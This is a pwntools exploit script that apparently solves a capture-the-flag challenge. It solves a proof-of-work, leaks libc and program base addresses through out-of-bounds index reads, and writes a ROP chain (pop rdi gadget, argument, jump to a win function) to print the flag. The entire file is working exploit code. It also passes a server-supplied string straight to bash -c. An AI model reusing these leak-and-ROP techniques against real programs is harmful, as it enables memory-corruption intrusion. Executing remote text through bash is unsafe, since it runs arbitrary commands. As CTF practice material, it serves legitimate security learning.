#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *


def handle_pow(r):
    r.recvline()
    challenge = r.recvline().decode('ascii').strip()
    log.info(f'Solving pow -> {challenge}')
    p = pwnlib.tubes.process.process(['bash', '-c', challenge])
    solution = p.recvline().strip()
    p.close()
    r.recvuntil(b'solution: ')
    r.sendline(solution)


def convert(int_num):
    if int_num < 0:
        int_num = int_num + 2 ** 32
    return int_num


context.binary = exe = ELF('/home/user/chal', checksec=False)
libc = ELF('/home/user/libc.so.6', checksec=False)
rop = ROP(libc)

io = pwnlib.tubes.remote.remote('challenge', 1337)
tmp_data = io.recv(len('proof'), timeout=2)
if tmp_data == b'proof':
    handle_pow(io)
else:
    io.unrecv(tmp_data)

# Leak libc
io.sendlineafter(b'> ', b'1')
io.sendlineafter(b': ', b'26')  # libc_start_main_return
io.sendlineafter(b': ', b'-')
libc.address = convert(int(io.recvline(keepends=False).split(b'stored ')[1])) - libc.libc_start_main_return
log.info(f'libc base: {hex(libc.address)}')

# Leak program address
io.sendlineafter(b'> ', b'1')
io.sendlineafter(b': ', b'30')  # main
io.sendlineafter(b': ', b'-')
exe.address = convert(int(io.recvline(keepends=False).split(b'stored ')[1])) - exe.sym['main']
log.info(f'elf base: {hex(exe.address)}')

# ROP chain
pop_rdi = libc.address + rop.find_gadget(['pop rdi', 'ret'])[0]
io.sendlineafter(b'> ', b'1')
io.sendlineafter(b': ', b'26')  # libc_start_main_return -> pop rdi; ret
io.sendlineafter(b': ', str(pop_rdi).encode())

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b': ', b'28')  # arg1
io.sendlineafter(b': ', b'102')  # character f

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b': ', b'30')  # main -> win
io.sendlineafter(b': ', str(exe.sym['win'] + 5).encode())  # stack alignment

io.sendlineafter(b'> ', b'2')
print(io.recvuntil(b"}"))

exit(0)
